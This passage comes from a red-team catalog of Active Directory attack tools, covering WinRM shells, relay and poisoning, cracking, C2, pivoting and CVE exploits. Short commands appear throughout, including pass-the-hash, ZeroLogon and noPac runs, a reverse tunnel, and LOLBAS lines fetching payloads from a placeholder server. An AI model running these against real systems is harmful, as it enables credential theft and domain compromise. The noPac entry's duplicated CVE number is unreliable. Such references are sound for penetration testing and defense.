| **Vendor** | Hackplayers |
| **Category** | LAT |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `gem install evil-winrm` |
| **Repo** | https://github.com/Hackplayers/evil-winrm |

**Description:** Ruby-based WinRM shell with advanced features including file upload/download, pass-the-hash, Kerberos, and local privilege escalation.

**Key Features:**
- Full WinRM interactive shell
- Pass-the-hash (NTLM hash auth)
- Kerberos authentication
- IPv6 support
- File upload/download
- PowerShell inline execution
- Load PowerShell modules from memory
- Bypass features (AMSI, execution policy)
- Kerberos ticket (ccache) authentication

**Red Team Use:**
- Stable remote shell via WinRM
- Lateral movement with hash or ticket
- Interactive exploration after compromise

**Key Commands:**
```bash
# Password auth
evil-winrm -i target -u user -p pass

# Pass-the-hash
evil-winrm -i target -u user -H NTLM

# SSL
evil-winrm -i target -u user -p pass -S

# Kerberos
evil-winrm -i target.domain.local -u user -p pass -k
```

---

## <span style="color:rgb(146, 208, 80)">Privilege Escalation (Local)</span>

---

### WinPEAS / PEASS-ng

| Property | Value |
|----------|-------|
| **Vendor** | Carlos Polop (carlospolop) |
| **Category** | PE |
| **Platform** | Windows (.exe, .ps1) |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub releases |
| **Repo** | https://github.com/peass-ng/PEASS-ng |

**Description:** Windows local privilege escalation checker that enumerates system information, services, files, registry, and AD config for privilege escalation vectors.

**Key Features:**
- Service permissions and binary paths
- Unquoted service paths
- AlwaysInstallElevated check
- Token privileges
- Registry keys and autoruns
- Scheduled tasks
- Network shares and creds
- Windows Defender/AV status
- AMSI bypass status
- AD user/group info
- LAPS status
- Credentials in files

**Red Team Use:**
- Post-exploitation enumeration
- Identify local privilege escalation vectors
- Check AD integration for domain priv esc

**Key Commands:**
```powershell
# Quick scan
winpeas.exe

# Specific checks
winpeas.exe systeminfo
winpeas.exe servicesinfo
winpeas.exe filesinfo
```

---

### Seatbelt

| Property | Value |
|----------|-------|
| **Vendor** | GhostPack |
| **Category** | PE, ENUM |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/GhostPack/Seatbelt |

**Description:** C# security-oriented host survey tool for Windows. Collects system-wide configuration, security settings, and audit information.

**Key Features:**
- System information enumeration
- Windows Defender/AppLocker/LSA protection status
- LAPS configuration check
- Token/privilege analysis
- Scheduled tasks
- Interesting file discovery
- Network shares and connections
- Browser data and registry artifacts

**Red Team Use:**
- Post-exploitation system audit
- Identify misconfigurations
- Gather intelligence for lateral movement

**Key Commands:**
```powershell
# All checks
Seatbelt.exe -group=all

# Specific group
Seatbelt.exe -group=system

# Specific commands
Seatbelt.exe TokenPrivileges,WindowsDefender,AppLocker
```

---

### SharpUp

| Property | Value |
|----------|-------|
| **Vendor** | GhostPack |
| **Category** | PE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/GhostPack/SharpUp |

**Description:** C# port of PowerUp (PowerSploit). Focused specifically on Windows privilege escalation vulnerabilities.

**Key Features:**
- Service binary hijacking checks
- Unquoted service paths
- AlwaysInstallElevated check
- Modifiable service binaries
- Modifiable registry autoruns
- DLL hijacking opportunities

**Red Team Use:**
- Post-exploitation privilege escalation
- Identify writable service paths
- DLL hijacking opportunity discovery

**Key Commands:**
```powershell
# Audit all checks
SharpUp.exe audit

# Specific vulnerability
SharpUp.exe audit UnquotedServicePath
```

---

### Watson

| Property | Value |
|----------|-------|
| **Vendor** | RastaMouse |
| **Category** | PE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/rasta-mouse/Watson |

**Description:** C# tool enumerates missing KBs and suggests Windows privilege escalation exploits.

**Key Features:**
- Checks OS version and build number
- Lists missing security patches
- Suggests relevant exploits
- CVE references

**Red Team Use:**
- Identify missing patches for exploitation
- Kernel exploit suggestion
- Post-exploitation recon

**Key Commands:**
```powershell
Watson.exe
```

---

### PowerSploit

| Property | Value |
|----------|-------|
| **Vendor** | PowerShellMafia |
| **Category** | PE, CRED, LAT, PERS |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | `Import-Module PowerSploit.psm1` |
| **Repo** | https://github.com/PowerShellMafia/PowerSploit |

**Description:** PowerShell post-exploitation framework with modules for code execution, persistence, privilege escalation, and recon.

**Key Features:**
- PowerView (AD recon)
- PowerUp (privilege escalation)
- PowerCat (networking utilities)
- Invoke-* injection commands
- Code execution and bypass techniques
- Persistence modules

**Red Team Use:**
- Legacy but reliable PowerShell framework
- PowerUp for local escalation
- PowerView for AD recon
- Still useful for older targets

---

## <span style="color:rgb(146, 208, 80)">NTLM Relay & Coercion</span>

---

### Responder

| Property | Value |
|----------|-------|
| **Vendor** | Laurent Gaffié (lgandx) |
| **Category** | RELAY, COERCE |
| **Platform** | Linux |
| **Cost** | Free (open source) |
| **Install** | `apt install responder` / `git clone https://github.com/lgandx/Responder` |
| **Repo** | https://github.com/lgandx/Responder |

**Description:** LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers (HTTP, SMB, SQL, FTP, LDAP, etc.).

**Key Features:**
- LLMNR/NBT-NS/mDNS poisoning
- Rogue authentication servers (SMB, HTTP, HTTPS, SQL, FTP, IMAP, POP3, LDAP)
- WPAD rogue proxy
- IPv6 support
- Multi-relay mode (with ntlmrelayx)
- Browser Listener poisoning
- DHCP/DHCPv6 support
- Analogue (analyze mode)

**Red Team Use:**
- Credential capture via link-local name resolution poisoning
- Set up relay chain with Impacket ntlmrelayx.py
- WPAD for proxy credential capture

**Key Commands:**
```bash
# Basic poisoning
responder -I eth0 -wrf

# Analyze mode (just observe)
responder -I eth0 -A

# Off (only serve, no poison)
responder -I eth0 -e 10.0.0.5 -wrf
```

---

### Inveigh / InveighZero

| Property | Value |
|----------|-------|
| **Vendor** | Kevin Robertson (Inveigh) / KFosaaen (Zero) |
| **Category** | RELAY, COERCE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 / binary from GitHub |
| **Repo** | https://github.com/Kevin-Robertson/Inveigh |

**Description:** Windows-based LLMNR/NBT-NS/mDNS poisoner with credential capture and SMB relay capabilities.

**Key Features:**
- LLMNR, NBT-NS, mDNS poisoning
- HTTP/HTTPS/WebDAV credential capture
- SMB relay
- DHCPv6 DNS poisoning
- Kerberos ticket requests capture

**Red Team Use:**
- Credential capture from Windows attack host
- Cross-protocol relay without requiring Linux
- InveighZero (C#) for modern Windows

**Key Commands:**
```powershell
# PowerShell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTP Y

# C# (Zero)
InveighZero.exe -All Y -Console Y -File Y
```

---

### mitm6

| Property | Value |
|----------|-------|
| **Vendor** | Fox-IT |
| **Category** | RELAY |
| **Platform** | Linux |
| **Cost** | Free (open source) |
| **Install** | `pip install mitm6` / `apt install mitm6` |
| **Repo** | https://github.com/fox-it/mitm6 |

**Description:** IPv6 DNS poisoning tool that responds to IPv6 DNS queries, tricking Windows machines into authenticating to an attacker-controlled LDAP server.

**Key Features:**
- IPv6 DNS poisoning (WPAD, ISATAP, etc.)
- Forces Windows to prefer IPv6 over IPv4
- Combines with ntlmrelayx for relay attacks
- WPAD detection and abuse

**Red Team Use:**
- Force machine account authentication via IPv6
- Relay to LDAP for ADCS certificate (ESC8)
- Relay to SMB for credential capture

**Key Commands:**
```bash
# Basic mitm6 + ntlmrelayx chain
mitm6 -d domain.local -i eth0

# In another terminal:
ntlmrelayx.py -t ldaps://dc01.domain.local -ip 10.0.0.5
```

---

### LDAPRelayScan

| Property | Value |
|----------|-------|
| **Vendor** | Zynk |
| **Category** | RELAY, ENUM |
| **Platform** | Windows, Linux |
| **Cost** | Free (open source) |
| **Install** | Download from GitHub |
| **Repo** | https://github.com/zynk-dev/LDAPRelayScan |

**Description:** Tool to scan AD for LDAP signing and channel binding configuration, identifying relay attack opportunities.

**Key Features:**
- Scans DCs for LDAP signing status
- Checks LDAP channel binding policy
- Identifies relay-eligible targets
- CSV/HTML output

**Red Team Use:**
- Identify DCs vulnerable to LDAP relay
- Plan relay attack chain
- Pre-engagement recon

---

## <span style="color:rgb(146, 208, 80)">DNS & Network Discovery</span>

---

### adidnsdump

| Property | Value |
|----------|-------|
| **Vendor** | Dirk-jan Molma |
| **Category** | DNS, ENUM |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install adidnsdump` |
| **Repo** | https://github.com/dirkjanm/adidnsdump |

**Description:** Dump all AD-integrated DNS records including forward and reverse lookup zones for comprehensive network mapping.

**Key Features:**
- Dumps all DNS zones in AD DNS
- Forward and reverse lookup records
- Resolve IPs from hostnames
- LDAP and DNS queries
- JSON/CSV output

**Red Team Use:**
- Network mapping via AD DNS records
- Identify servers, workstations, and network ranges
- Discover hidden hosts and services

**Key Commands:**
```bash
# Dump all records
adidnsdump -u domain\user -p pass domain.local --all

# Resolve IPs
adidnsdump -u domain\user -p pass domain.local --resolve
```

---

## <span style="color:rgb(146, 208, 80)">Password Spraying & Brute Force</span>

---

### Hashcat

| Property | Value |
|----------|-------|
| **Vendor** | Atom |
| **Category** | CRACK |
| **Platform** | Linux, macOS, Windows |
| **Cost** | Free (open source) |
| **Install** | `apt install hashcat` / download from hashcat.net |
| **Repo** | https://github.com/hashcat/hashcat |

**Description:** The world's fastest password recovery tool with GPU acceleration. Supports 300+ hash types including NTLM, Kerberos, NetNTLMv2, DCC2.

**Key Features:**
- GPU-accelerated (CUDA, OpenCL)
- 300+ hash modes
- Rule-based, mask, dictionary, combinator attacks
- Markov and PRINCE attacks
- Automatic performance tuning

**Red Team Use:**
- Crack NTLM hashes from DCSync
- Crack Kerberoast hashes (KRB5TGS)
- Crack AS-REP roast hashes
- Crack NetNTLMv2 from Responder captures

**Key Commands:**
```bash
# NTLM
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r rules.rule

# Kerberoast (mode 13100)
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# NetNTLMv2 (5600)
hashcat -m 5600 captured_hashes.txt wordlist.txt

# AS-REP (18200)
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Show cracked
hashcat -m 1000 ntlm_hashes.txt --show
```

---

### John the Ripper

| Property | Value |
|----------|-------|
| **Vendor** | OpenWall |
| **Category** | CRACK |
| **Platform** | Linux, macOS, Windows |
| **Cost** | Free (open source) |
| **Install** | `apt install john` / `brew install john` |
| **Repo** | https://github.com/openwall/john |

**Description:** Classic password cracking tool supporting CPU-based cracking with extensive hash format support.

**Key Features:**
- CPU-based cracking (Jumbo supports GPU too)
- Hundreds of hash formats
- Wordlist, incremental, Markov, mask modes
- Single crack mode

**Red Team Use:**
- Crack hashes when GPU not available
- Process Kerberoast/AS-REP results
- Fallback when hashcat not an option

**Key Commands:**
```bash
john ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john kerberoast_hashes.txt --wordlist=wordlist.txt
john --show ntlm_hashes.txt
```

---

## <span style="color:rgb(146, 208, 80)">C2 Frameworks</span>

---

### Empire / Starkiller

| Property | Value |
|----------|-------|
| **Vendor** | BC Security |
| **Category** | C2 |
| **Platform** | Linux (server), Windows (agents), Web (Starkiller) |
| **Cost** | Free (open source) |
| **Install** | `git clone && setup/install.sh` |
| **Repo** | https://github.com/BC-SECURITY/Empire |
| **Repo** | https://github.com/BC-SECURITY/Starkiller |

**Description:** PowerShell and Python post-exploitation agent framework with GUI (Starkiller). Modular agents with AD-specific modules.

**Key Features:**
- PowerShell and Python agents
- Module system (recon, privesc, persistence, exfiltration)
- Starkiller (web-based GUI)
- Built-in Mimikatz, PowerView, Rubeus integration
- Multi-user team server

**Red Team Use:**
- PowerShell-based C2 for Windows targets
- AD attack module execution
- Multiple listener types (HTTP, HTTPS, DNS, SMB)

---

### Covenant

| Property | Value |
|----------|-------|
| **Vendor** | Ryan Cobb (cobbr) |
| **Category** | C2 |
| **Platform** | Linux, macOS, Windows (.NET) |
| **Cost** | Free (open source) |
| **Install** | `dotnet build` / download binary |
| **Repo** | https://github.com/cobbr/Covenant |

**Description:** .NET-based C2 framework with web-based interface, dynamic compilation, and extensive C# tool integration.

**Key Features:**
- Web-based GUI
- Dynamic C# code compilation
- Grunt (agent) with HTTP/HTTPS/SMB listeners
- Built-in GhostPack tools (Seatbelt, SharpUp, Rubeus)
- Launcher generation (powershell, msbuild, wmic, etc.)

**Red Team Use:**
- .NET-focused C2 for Windows
- Execute C# tools in-memory
- AD attacks via integrated tooling

---

### Sliver

| Property | Value |
|----------|-------|
| **Vendor** | BishopFox |
| **Category** | C2 |
| **Platform** | Linux, macOS, Windows |
| **Cost** | Free (open source) |
| **Install** | `curl https://sliver.sh/install | sudo bash` |
| **Repo** | https://github.com/BishopFox/sliver |

**Description:** General-purpose implant C2 framework with multi-player support, strong encryption, and extensive operator tooling.

**Key Features:**
- Multi-player operator support
- HTTP/HTTPS/DNS/MTLS/TCP/WG listeners
- Implant generation (Windows, Linux, macOS)
- Execute-assembly support
- SOCKS5 proxy
- BOF (Beacon Object File) support
- Built-in port forwarding
- ARM/x86/x64 support

**Red Team Use:**
- Modern, actively developed C2
- AD attack execution via execute-assembly
- Pivot/Proxy for deeper network access

---

### Mythic

| Property | Value |
|----------|-------|
| **Vendor** | Its-a-feature |
| **Category** | C2 |
| **Platform** | Linux, macOS (server), Web (UI) |
| **Cost** | Free (open source) |
| **Install** | `make` from GitHub |
| **Repo** | https://github.com/its-a-feature/Mythic |

**Description:** Multi-agent C2 framework with web UI, plugin architecture, and cross-platform agent support.

**Key Features:**
- Web-based UI with tasking
- Plugin system (Agents, C2 profiles, Payload types)
- Multiple agent types (Apollo, Poseidon, Athena, etc.)
- Transports: HTTP, WebSocket, DNS, SMB
- Dynamic payload generation
- Task chaining and callback

**Red Team Use:**
- Flexible, extensible C2 platform
- Agent choice based on target OS
- AD-specific agents and payloads

---

## <span style="color:rgb(146, 208, 80)">Tunneling & Pivoting</span>

---

### Ligolo-ng

| Property | Value |
|----------|-------|
| **Vendor** | N!co C0rti |
| **Category** | TUN |
| **Platform** | Linux, Windows, macOS |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub releases |
| **Repo** | https://github.com/nicocha30/ligolo-ng |

**Description:** Tunneling/pivoting tool using TUN interfaces to create a layer 3 network tunnel between attacker and compromised host.

**Key Features:**
- Layer 3 network tunnel via TUN interface
- Multi-platform agent
- SOCKS proxy support
- UDP tunneling
- Traffic routing and forwarding
- Encrypted communication

**Red Team Use:**
- Deep network pivoting through jump boxes
- Full network access behind firewalls
- Bypass segmentation constraints

---

### Chisel

| Property | Value |
|----------|-------|
| **Vendor** | Jpillora |
| **Category** | TUN |
| **Platform** | Linux, Windows, macOS |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/jpillora/chisel |

**Description:** Fast TCP/UDP tunnel over HTTP/S with SOCKS proxy support. Single binary for both client and server.

**Key Features:**
- HTTP/HTTPS tunnel encapsulation
- SOCKS5 proxy
- Reverse and forward port forwarding
- Single binary (Go, statically linked)

**Red Team Use:**
- Quick SOCKS proxy through restrictive egress
- Pivoting through web-only networks
- Proxy for nmap/other tools through target network

**Key Commands:**
```bash
# Server (attacker)
chisel server -p 8080 --reverse

# Client (target)
chisel client attacker:8080 R:socks
```

---

### Frp (Fast Reverse Proxy)

| Property | Value |
|----------|-------|
| **Vendor** | Fatedier |
| **Category** | TUN |
| **Platform** | Linux, Windows, macOS |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub |
| **Repo** | https://github.com/fatedier/frp |

**Description:** Fast reverse proxy with TCP, UDP, HTTP, HTTPS protocols. Supports multiple multiplexed tunnels.

**Key Features:**
- TCP/UDP/HTTP/HTTPS tunnel
- Multiple protocol support
- Load balancing
- Encryption
- Dashboard UI
- Port multiplexing

**Red Team Use:**
- Expose internal services
- Reverse tunnels out of restrictive networks
- HTTP/S concealment of C2 traffic

---

### Neo-reGeorg

| Property | Value |
|----------|-------|
| **Vendor** | L-codes |
| **Category** | TUN |
| **Platform** | Python (client), PHP/ASPX/JSP (server) |
| **Cost** | Free (open source) |
| **Install** | `pip install neoreGeorg` / download |
| **Repo** | https://github.com/L-codes/Neo-reGeorg |

**Description:** HTTP tunnel tool based on the original reGeorg. Creates SOCKS proxy through web shells.

**Key Features:**
- HTTP tunnel through web shells (PHP, ASPX, JSP)
- SOCKS5 proxy
- Encrypted payloads
- Header randomization for OPSEC

**Red Team Use:**
- Proxy through compromised web servers
- Tunneling when only HTTP egress is available
- Pivoting from DMZ web servers

---

## <span style="color:rgb(146, 208, 80)">Port Scanning & Discovery</span>

---

### Nmap

| Property | Value |
|----------|-------|
| **Vendor** | Gordon Lyon (Insecure.org) |
| **Category** | DISC |
| **Platform** | Linux, Windows, macOS |
| **Cost** | Free (open source) |
| **Install** | `apt install nmap` / `choco install nmap` |
| **Repo** | https://github.com/nmap/nmap |

**Description:** Industry standard network port scanner with advanced scripting (NSE), OS detection, service fingerprinting, and vulnerability scanning.

**Key Features:**
- TCP/UDP port scanning (SYN, Connect, FIN, NULL, etc.)
- Service and version detection
- OS fingerprinting
- NSE scripts for AD recon (smb-enum, krb5-enum, ldap-rootdse)
- Output in XML, grepable, normal formats

**Red Team Use:**
- Network discovery and host enumeration
- Identify domain controllers, servers, workstations
- NSE scripts for AD service enumeration

**Key Commands:**
```bash
# Quick scan
nmap -sn 10.0.0.0/24

# Full port scan
nmap -sS -p- -T4 target

# Service version detection
nmap -sV -sC target

# AD-specific scripts
nmap --script smb-enum-shares,smb-os-discovery,ldap-rootdse target

# UDP scan
nmap -sU -p 53,88,389,445 target

# KRB5 enum
nmap --script krb5-enum-users --script-args krb5-enum-users-realm='domain.local' target
```

---

### Masscan

| Property | Value |
|----------|-------|
| **Vendor** | Robert Graham |
| **Category** | DISC |
| **Platform** | Linux |
| **Cost** | Free (open source) |
| **Install** | `apt install masscan` |
| **Repo** | https://github.com/robertdavidgraham/masscan |

**Description:** The fastest Internet port scanner. Capable of scanning the entire Internet in minutes. Asynchronous TCP scanner.

**Key Features:**
- Extremely fast TCP scanning
- Banner grabbing
- Random IP output
- Masscan -> Nmap compatible output

**Red Team Use:**
- Large-scale network discovery
- Fast port identification
- Quick service discovery on /8 or /16 networks

**Key Commands:**
```bash
# Quick scan subnet
masscan 10.0.0.0/24 -p 22,80,443,445,3389,5985,5986

# Full subnet scan
masscan 10.0.0.0/8 -p 0-65535 --rate=10000

# Output compatible with nmap
masscan 10.0.0.0/24 -p 445,3389 -oX results.xml
```

---

### RustScan

| Property | Value |
|----------|-------|
| **Vendor** | Beeiona |
| **Category** | DISC |
| **Platform** | Linux, macOS, Windows |
| **Cost** | Free (open source) |
| **Install** | `cargo install rustscan` / download binary |
| **Repo** | https://github.com/RustScan/RustScan |

**Description:** Modern port scanner written in Rust with adaptive learning. Automatically pipes results to Nmap for service detection.

**Key Features:**
- 3-second full port scan on local networks
- Adaptive port scanning (learns network behavior)
- Automatic Nmap integration
- Scripting support
- Configurable batch size

**Red Team Use:**
- Fast initial network discovery
- Quick port identification, then Nmap for deeper scan
- Automated scanning in pipelines

**Key Commands:**
```bash
# Quick scan (then auto-Nmap)
rustscan -a target -- -A

# Batch scan
rustscan -a targets.txt --range 1-10000 -- -sV
```

---

### SQLMap

| Property | Value |
|----------|-------|
| **Vendor** | Bernardo Damele / Miroslav Stampar |
| **Category** | DISC |
| **Platform** | Linux, macOS, Windows |
| **Cost** | Free (open source) |
| **Install** | `apt install sqlmap` / `pip install sqlmap` |
| **Repo** | https://github.com/sqlmapproject/sqlmap |

**Description:** Automatic SQL injection and database takeover tool. Can be used to extract AD-linked application data from vulnerable web apps.

**Key Features:**
- Automatic SQL injection detection
- Database fingerprinting
- Data extraction
- OS shell via SQLi
- Pass-the-hash for DB auth (MSSQL)

**Red Team Use:**
- Extract AD-joined application data
- Gain initial access via web SQL injection
- Pivot from database to AD

---

## <span style="color:rgb(146, 208, 80)">EDR, Sysinternals & DFIR</span>

---

### Sysmon

| Property | Value |
|----------|-------|
| **Vendor** | Microsoft (Sysinternals) |
| **Category** | DFIR |
| **Platform** | Windows |
| **Cost** | Free |
| **Install** | Download from Microsoft / Sysinternals |
| **Repo** | https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon |

**Description:** Windows system monitoring driver that logs process creation, network connections, file changes, and registry modifications to Windows Event Log.

**Key Features:**
- Process creation logging (CommandLine, Hash, Parent)
- Network connection logging
- File creation and modification logging
- Registry key access and modification logging
- DLL loading logging
- Driver loading logging
- Pipe creation logging
- Configurable via XML config (include/exclude rules)

**Red Team Use:**
- Understand what is logged (OPSEC planning)
- Test detections before engagement
- Sysmon config analysis for bypass opportunities

---

### KAPE (Kroll Artifact Parser Extractor)

| Property | Value |
|----------|-------|
| **Vendor** | Kroll (Eric Zimmerman) |
| **Category** | DFIR |
| **Platform** | Windows |
| **Cost** | Free |
| **Install** | Download from Kroll |
| **Repo** | https://www.kroll.com/en/services/cyber-risk/kape-collector |

**Description:** Forensic artifact triage and collection tool. Targets and collects Windows artifacts relevant to incident response and forensics.

**Key Features:**
- Target-based collection (collect only specific artifacts)
- Module-based processing
- Pre-built target and module definitions
- Output in standardized format
- CLI and GUI modes

**Red Team Use:**
- Collect forensic evidence post-engagement
- Artifact cleanup after actions
- Understand what artifacts are collectable

---

### Microsoft Defender for Endpoint (MDE)

| Property | Value |
|----------|-------|
| **Vendor** | Microsoft |
| **Category** | DFIR |
| **Platform** | Windows (built-in) |
| **Cost** | Paid (E5 license) |
| **Install** | Built into Windows 10/11 / Server 2016+ |
| **Repo** | N/A |

**Description:** Enterprise-grade EDR solution built into Windows. Monitors processes, network connections, file operations, and registry changes for suspicious behavior.

**Key Features:**
- Real-time behavioral monitoring
- Cloud-powered ML detections
- Automated investigation and response
- ASR (Attack Surface Reduction) rules
- Tamper protection
- Block at sight

**Red Team Use:**
- Critical OPSEC planning for all Windows targets
- MDE detection bypass research
- ASR rule bypass testing
- Living Off the Land binaries allowed by default

---

### LOLBAS / LOLDrivers

| Property | Value |
|----------|-------|
| **Vendor** | Community |
| **Category** | LOL, PE, LAT |
| **Platform** | Windows |
| **Cost** | Free |
| **Install** | Web resource (not a tool, a reference) |
| **Repo** | https://lolbas-project.github.io / https://www.loldrivers.io |

**Description:** Reference projects cataloging Windows binaries (LOLBAS) and drivers (LOLDrivers) that can be used by attackers for execution, evasion, persistence, and lateral movement.

**Key Features:**
- LOLBAS: Living Off The Land Binaries and Scripts
- LOLDrivers: Living Off The Land Drivers
- Categories: Execution, Scripting, Download, Bypass, etc.
- Covers certutil, mshta, msiexec, powershell, wmic, etc.

**Red Team Use:**
- Use trusted signed binaries for malicious purposes
- Bypass application whitelisting
- Evade EDR by using known-good binaries

**Examples:**
```powershell
# certutil download
certutil -urlcache -f http://server/file.exe file.exe

# mshta execution
mshta.exe http://server/payload.hta

# wmic execution
wmic.exe process call create "calc.exe"

# regsvr32 bypass
regsvr32.exe /s /n /u /i:http://server/payload.sct scrobj.dll
```

---

### WES-NG (Windows Exploit Suggester)

| Property | Value |
|----------|-------|
| **Vendor** | Bitsadmin |
| **Category** | PE |
| **Platform** | Python (any) |
| **Cost** | Free (open source) |
| **Install** | `pip install windows-exploit-suggester` |
| **Repo** | https://github.com/bitsadmin/wesng |

**Description:** Python script comparing Windows OS version and patch level against a vulnerability database to suggest privilege escalation exploits.

**Key Features:**
- Compares systeminfo output against CVE database
- Identifies missing security patches
- Suggests relevant exploits
- Updates vulnerability database from Microsoft

**Red Team Use:**
- Identify missing patches for kernel exploits
- Version-aware priv esc planning

**Key Commands:**
```bash
# Update database
wesng.py --update

# Check system
systeminfo > sysinfo.txt
wesng.py sysinfo.txt
```

---

## <span style="color:rgb(146, 208, 80)">Metasploit & Post-Exploitation</span>

---

### Metasploit (MSF)

| Property | Value |
|----------|-------|
| **Vendor** | Rapid7 |
| **Category** | C2, LAT, PE, CRED |
| **Platform** | Linux, Windows, macOS |
| **Cost** | Free (open source) / Pro (paid) |
| **Install** | `apt install metasploit-framework` / installer from rapid7.com |
| **Repo** | https://github.com/rapid7/metasploit-framework |

**Description:** The most widely used exploitation framework. Contains thousands of exploits, payloads, and auxiliary modules for AD attacks.

**Key Features:**
- Exploit database (thousands of modules)
- Payload generation (Meterpreter, shell, etc.)
- Auxiliary modules (scanners, fuzzers, enum)
- Post-exploitation modules (AD enum, cred gathering)
- SMB relay, Kerberos, LDAP modules
- Pass-the-hash framework
- Database integration

**Red Team Use:**
- Initial exploitation and access
- AD enumeration via post-exploitation modules
- Credential harvesting via Meterpreter
- Pivoting through compromised hosts

**Key Commands:**
```msf
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > use auxiliary/gather/ldap_query
msf6 > use post/windows/gather/enum_ad_users
msf6 > use post/windows/gather/enum_domain_tokens
msf6 > use auxiliary/server/responder
```

---

## <span style="color:rgb(146, 208, 80)">Vulnerability & Exploit Specific Tools</span>

---

### CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)

| Property | Value |
|----------|-------|
| **Vendor** | cube0x0 / various |
| **Category** | PE, LAT |
| **Platform** | Windows |
| **Cost** | Free (OSS) |
| **Install** | Download binaries/CNA from GitHub |
| **Repo** | https://github.com/cube0x0/CVE-2021-1675 |

**Description:** Print Spooler RCE and LPE vulnerability. RCE via `RpcAddPrinterDriver` (MS-RPRN). LPE via DLL loading. Multiple PoC implementations exist in Python, C#, PowerShell.

**Key Features:**
- Remote code execution as SYSTEM on print server
- Local privilege escalation via DLL
- CVE-2021-1675 (original) and CVE-2021-34527 (bypass)
- Impacket-based exploitation (cube0x0 fork)
- C# implementation (SpoolFool)

**Red Team Use:**
- Privilege escalation from user to SYSTEM
- Lateral movement to print servers for RCE

---

### noPac (sam-the-admin)

| Property | Value |
|----------|-------|
| **Vendor** | Risksc/ly4k |
| **Category** | PE |
| **Platform** | Python, C# |
| **Cost** | Free (OSS) |
| **Install** | `git clone && pip install` |
| **Repo** | https://github.com/ly4k/Pachine |

**Description:** Exploit for CVE-2021-42287 (sAMAccountName spoofing) + CVE-2021-42287 (Kerberos KDC confusion) combined attack for domain privilege escalation.

**Key Features:**
- Elevate from standard domain user to DA
- Exploits Kerberos KDC DC canonicalization
- Python (noPac) and C# (sam-the-admin) PoC
- Impacket integration

**Red Team Use:**
- Quick domain admin from any user
- No special requirements (no ADCS, no delegation)

**Key Commands:**
```bash
# noPac
noPac.py domain.local/user:pass -dc-ip DC_IP -dc-host dc01.domain.local
```

---

### ZeroLogon (CVE-2020-1472)

| Property | Value |
|----------|-------|
| **Vendor** | Secura (CVE-2020-1472 PoC) |
| **Category** | PE |
| **Platform** | Python |
| **Cost** | Free (OSS) |
| **Install** | `git clone && pip install -r requirements.txt` |
| **Repo** | https://github.com/SecuraBV/CVE-2020-1472 |

**Description:** CVE-2020-1472 exploit allowing an unauthenticated attacker with network access to a DC to compromise the domain admin account.

**Key Features:**
- Unauthenticated Netlogon protocol bypass
- Reset computer account password to empty
- DCSync from DC's machine account
- Affects all Windows Server versions

**Red Team Use:**
- Full domain compromise without any credentials
- Check and exploit ZeroLogon

**Key Commands:**
```bash
# Check vulnerability
zerologon-check.py dc01.domain.local

# Exploit
python3 zerologon-exploit.py dc01.domain.local
```

---

# <span style="color:rgb(255, 0, 0)">Quick Reference Tables</span>

---

## <span style="color:rgb(0, 176, 240)">Commercial Tools Quick Reference</span>

| Tool | Category | Cost | Platform | Primary Use |
|------|----------|------|----------|-------------|
| BloodHound Enterprise | ENUM, PE | Paid | Web + Collector | Continuous attack path mapping |
| PingCastle | ENUM, GPO | Free/Paid | Windows | AD security posture assessment |
| Purple Knight | ENUM | Free | Windows | Free AD security scoring |
| Forest Druid | ENUM, PE | Free/Paid | Windows | Tier 0 attack path analysis |
| Semperis DSP | DFIR | Paid | Windows + Web | AD real-time protection |
| CrowdStrike Falcon ID | DFIR | Paid | SaaS + Agent | Identity threat detection |
| Microsoft Defender for Identity | DFIR | Paid | Cloud + Sensor | AD threat detection & analytics |
| Tenable Identity Exposure | ENUM, DFIR | Paid | Windows + Web | Continuous AD attack path detection |
| Netwrix Auditor | DFIR | Paid | Windows + Web | AD change auditing |
| ManageEngine ADAudit Plus | DFIR | Paid | Windows + Web | AD auditing & compliance |
| Quest Change Auditor | DFIR | Paid | Windows + Web | Real-time AD change auditing |
| Varonis DatAdvantage | DFIR | Paid | Windows + Web | Data security & AD permission analysis |
| CyberArk PAS | PERS | Paid | Windows + Web | Privileged access management |
| Delinea Secret Server | PERS | Paid | Windows + Web | Credential vaulting & PAM |
| BeyondTrust PowerBroker | PERS, PE | Paid | Windows + Linux | Least-privilege & AD bridge |
| CipherTrust | PERS | Paid | Windows + Linux | Encryption & PKI management |
| RSA NetWitness | DFIR | Paid | Linux + Web | SIEM & network forensics |
| Splunk UBA | DFIR | Paid | Linux + Web | UEBA for AD attacks |
| Rapid7 InsightIDR | DFIR | Paid | Cloud + Collector | SIEM with AD threat detection |
| LogRhythm | DFIR | Paid | Windows + Web | SIEM platform |
| Securonix | DFIR | Paid | Cloud (SaaS) | Cloud-native SIEM/UEBA |
| AD-Bench | ENUM | Free/Paid | Windows | AD security benchmarking |
| Cobalt Strike | C2 | Paid | Linux + Windows | Commercial adversary simulation |
| Brute Ratel | C2 | Paid | Linux + Windows | Evasive C2 framework |
| Nighthawk | C2 | Paid | Linux + Windows | Premium evasive C2 |

---

## <span style="color:rgb(0, 176, 240)">Open Source / Free Tools Quick Reference</span>

| Tool | Category | Install | Platform | Primary Use |
|------|----------|---------|----------|-------------|
